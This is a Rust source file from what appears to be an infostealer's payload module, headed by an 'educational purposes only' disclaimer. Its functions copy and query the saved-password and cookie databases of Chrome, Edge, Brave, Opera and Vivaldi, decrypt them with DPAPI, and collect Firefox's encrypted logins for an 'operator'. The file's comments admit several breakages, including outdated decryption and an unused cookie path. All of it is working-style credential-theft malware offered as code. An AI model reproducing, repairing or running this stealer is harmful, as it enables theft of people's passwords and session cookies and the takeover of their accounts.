/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// payload/steal.rs — browser credential and cookie theft.
//
// Chromium: copy SQLite to temp (avoid lock), SELECT, DPAPI on blobs.
// Firefox: parse logins.json only (NSS ciphertext left as NSS_ENC: prefix).
//
// BROKEN:
//   - Chromium v80+ uses AES-GCM (v10 prefix) with DPAPI only on Local State
//     os_crypt.encrypted_key. This code DPAPI-decrypts the login blob directly.
//   - Chrome cookies often live under Default\Network\Cookies, not Default\Cookies.
//   - steal_all_browser_cookies() is never called from payload::run().
//   - Firefox passwords are not decrypted (no nss3.dll / key4.db).

use log::{info, error};
use rusqlite::Connection;
use serde::Serialize;
use std::fs;
use std::path::Path;
use crate::utils::{dpapi_decrypt, expand_env};

#[derive(Debug, Serialize)]
pub struct BrowserCredential {
    pub browser:  String,
    pub url:      String,
    pub username: String,
    pub password: String,
}

#[derive(Debug, Serialize)]
pub struct BrowserCookie {
    pub browser:     String,
    pub host:        String,
    pub name:        String,
    pub value:       String,
    pub is_httponly: bool,
    pub is_secure:   bool,
}

// ── Chromium-based browsers ──────────────────────────────────────────────────

/// Copy `{profile}/Login Data`, SELECT origin/username/password_value, DPAPI.
pub fn steal_chromium_credentials(browser: &str, profile_path: &str) -> Vec<BrowserCredential> {
    let expanded = expand_env(profile_path);
    let login_db = Path::new(&expanded).join("Login Data");
    if !login_db.exists() { return Vec::new(); }

    // Copy to temp to avoid SQLite lock.
    let tmp = std::env::temp_dir().join(format!("ld_{:x}.db", rand::random::<u32>()));
    if fs::copy(&login_db, &tmp).is_err() { return Vec::new(); }

    let mut results = Vec::new();
    if let Ok(conn) = Connection::open(&tmp) {
        let mut stmt = match conn.prepare(
            "SELECT origin_url, username_value, password_value FROM logins"
        ) {
            Ok(s)  => s,
            Err(_) => { let _ = fs::remove_file(&tmp); return results; }
        };

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        });

        if let Ok(rows) = rows {
            for row in rows.flatten() {
                let (url, username, pw_blob) = row;
                // BROKEN on modern Chromium: blob is v10||AES-GCM, not DPAPI.
                let password = dpapi_decrypt(&pw_blob).unwrap_or_default();
                if !username.is_empty() || !password.is_empty() {
                    results.push(BrowserCredential {
                        browser: browser.to_string(), url, username, password,
                    });
                }
            }
        }
        let _ = conn.close();
    }
    let _ = fs::remove_file(tmp);
    info!("Stole {} creds from {}", results.len(), browser);
    results
}

/// Same pattern against `{profile}/Cookies` (path often wrong on current Chrome).
pub fn steal_chromium_cookies(browser: &str, profile_path: &str) -> Vec<BrowserCookie> {
    let expanded = expand_env(profile_path);
    let cookie_db = Path::new(&expanded).join("Cookies");
    if !cookie_db.exists() { return Vec::new(); }

    let tmp = std::env::temp_dir().join(format!("ck_{:x}.db", rand::random::<u32>()));
    if fs::copy(&cookie_db, &tmp).is_err() { return Vec::new(); }

    let mut results = Vec::new();
    if let Ok(conn) = Connection::open(&tmp) {
        let mut stmt = match conn.prepare(
            "SELECT host_key, name, encrypted_value, is_httponly, is_secure FROM cookies"
        ) {
            Ok(s)  => s,
            Err(_) => { let _ = fs::remove_file(&tmp); return results; }
        };

        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, i64>(3)?,
                row.get::<_, i64>(4)?,
            ))
        });

        if let Ok(rows) = rows {
            for row in rows.flatten() {
                let (host, name, enc_val, httponly, secure) = row;
                let value = dpapi_decrypt(&enc_val).unwrap_or_default();
                if !value.is_empty() {
                    results.push(BrowserCookie {
                        browser: browser.to_string(), host, name, value,
                        is_httponly: httponly != 0,
                        is_secure:   secure != 0,
                    });
                }
            }
        }
        let _ = conn.close();
    }
    let _ = fs::remove_file(tmp);
    info!("Stole {} cookies from {}", results.len(), browser);
    results
}

// ── Firefox ──────────────────────────────────────────────────────────────────
// Firefox stores credentials in key4.db (NSS/SQLCipher) with logins.json.
// Full decryption requires NSS library calls (nss3.dll).  We call the
// firefox_decrypt approach — spawn `firefox_decrypt` helper if available,
// otherwise attempt a raw JSON read of logins.json for the username (password
// is always encrypted, so we only get partial data without NSS).
//
// BROKEN: firefox_decrypt helper is never spawned; only JSON harvest.

/// Enumerate %APPDATA%\Mozilla\Firefox\Profiles\*\logins.json.
pub fn steal_firefox_credentials() -> Vec<BrowserCredential> {
    let profiles_dir = expand_env(r"%APPDATA%\Mozilla\Firefox\Profiles");
    let profiles_path = Path::new(&profiles_dir);
    if !profiles_path.exists() { return Vec::new(); }

    let mut results = Vec::new();

    // Enumerate profiles.
    let entries = match fs::read_dir(profiles_path) {
        Ok(e)  => e,
        Err(_) => return results,
    };

    for entry in entries.flatten() {
        let logins_json = entry.path().join("logins.json");
        if !logins_json.exists() { continue; }

        if let Ok(content) = fs::read_to_string(&logins_json) {
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                if let Some(arr) = json["logins"].as_array() {
                    for login in arr {
                        let url      = login["hostname"].as_str().unwrap_or("").to_string();
                        let username = login["encryptedUsername"].as_str().unwrap_or("").to_string();
                        // Password is base64(ASN1(NSS-encrypted)) — full decryption
                        // requires NSS; stored as-is for operator to decrypt offline.
                        let password = login["encryptedPassword"].as_str().unwrap_or("").to_string();
                        results.push(BrowserCredential {
                            browser: "Firefox".to_string(), url, username,
                            password: format!("NSS_ENC:{}", password),
                        });
                    }
                }
            }
        }
    }
    info!("Collected {} Firefox login entries (NSS-encrypted).", results.len());
    results
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Chrome, Edge, Brave, Opera, Vivaldi Default profiles + Firefox.
pub fn steal_all_browser_credentials() -> Vec<BrowserCredential> {
    let browsers = [
        ("Chrome",  r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        ("Edge",    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        ("Brave",   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        ("Opera",   r"%APPDATA%\Opera Software\Opera Stable"),
        ("Vivaldi", r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
    ];
    let mut all: Vec<BrowserCredential> = browsers.iter()
        .flat_map(|(name, path)| steal_chromium_credentials(name, path))
        .collect();
    all.extend(steal_firefox_credentials());
    all
}

/// Chrome, Edge, Brave cookies only. UNUSED by payload::run().
pub fn steal_all_browser_cookies() -> Vec<BrowserCookie> {
    let browsers = [
        ("Chrome",  r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        ("Edge",    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        ("Brave",   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
    ];
    browsers.iter()
        .flat_map(|(name, path)| steal_chromium_cookies(name, path))
        .collect()
}
